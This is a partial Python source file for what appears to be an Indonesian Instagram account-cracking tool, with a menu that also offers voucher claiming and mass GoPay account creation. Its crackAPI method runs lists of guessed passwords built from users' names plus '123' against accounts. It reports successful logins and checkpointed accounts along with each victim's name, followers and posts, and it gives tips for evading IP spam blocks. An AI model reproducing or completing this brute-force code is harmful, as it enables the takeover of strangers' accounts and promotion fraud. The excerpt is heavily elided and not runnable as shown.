...
class instagram:
 ...
 WELCOME TO BOT AUTO CLAIM, GUNAKAN 
 TOOLS INI DENGAN BIJAK

 AUTHRO:Smith

 {H}≫{C} 01 {M}𝘾𝙇𝘼𝙄𝙈 𝙑𝙊𝙐𝘾𝙃𝙀𝙍{C}
 {H}≫{C} 02 {M}𝙂𝙀𝙏 𝘾𝘼𝙎𝙃𝘽𝘼𝘾𝙆{C}
 {H}≫{C} 03 {M}𝙈𝘼𝙆𝙀 𝙈𝙐𝙇𝙏𝙄𝙋𝙇𝙀 𝘼𝘾𝘾𝙊𝙐𝙉𝙏𝙎 𝙂𝙊𝙋𝘼𝙔{C}
 {H}≫{C} 04 {M}𝙎𝘾𝘼𝙉 𝙆𝙊𝘿𝙀{C}
 {H}≫{C} 05 {M}𝘼𝘾𝘾𝙊𝙐𝙉𝙏 𝙇𝙊𝙂𝙄𝙉{C}
 {H}≫{C} 06 {M}𝘾𝙃𝙀𝘾𝙆 𝘿𝙀𝙏𝘼𝙄𝙇𝙎{C}

 {H}≫{C} R{H}{C} Laporkan Bug
 {H}≫{C} E{H}{C} Exit{M}メ{C}
	""")
 ...
 [{U}>{C}] Anda bisa melaporkan langsung ke wa admin {H}088976551163{C}
 [{U}>{C}] Admin Dikaa Ganteng Banget
		""")
		exit()

	def ChangeLog(self):
		print(f"""
 [{H}>{C}] Fitur yang di update:
 ...
 {H}>{C} 1 FirstName+123
 {H}>{C} 2 FirtsName+123,FullName
 {H}>{C} 3 FirstName+123,FullName,Full Name
		""")
		c=input(f' {H}>>>{C} Password: ')
		if c=='1':
 ...
 [{M}!{C}] Jika alamat IP terkena spam hidupkan mode pesawat selama 10 detik doang ngab
		""")
	...
	def crackAPI(self,user,pas,uaAPI):
		...
		sys.stdout.write(f"\r [🕐][{K}{loop}/{len(internal)}{C}] {H}[OK🤩⨷ :{len(success)}]{C}  {M}[CP KONTOL😡⨷ :{len(checkpoint)}]{C} "),
		sys.stdout.flush()
		try:
			for pw in pas:
				...
				if "userId" in str(x_jason):
					...
					print(f"""\r {H}[>]{C} {H}STATUS : {H}OK🤩
  {H}[>]{C} {H}Name: {H}{nama}{C}{U} ×͜×{C}
  ...
  {H}[>]{C} {H}Postingan: {H}{postingan}{C}
					...
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print(f"""\r  
  {M}[>]{C} STATUS :  CHEKCPOINT KONTOL😡
  {M}[>]{C} Name: {M}{nama}{C}{U} ×͜×{C}
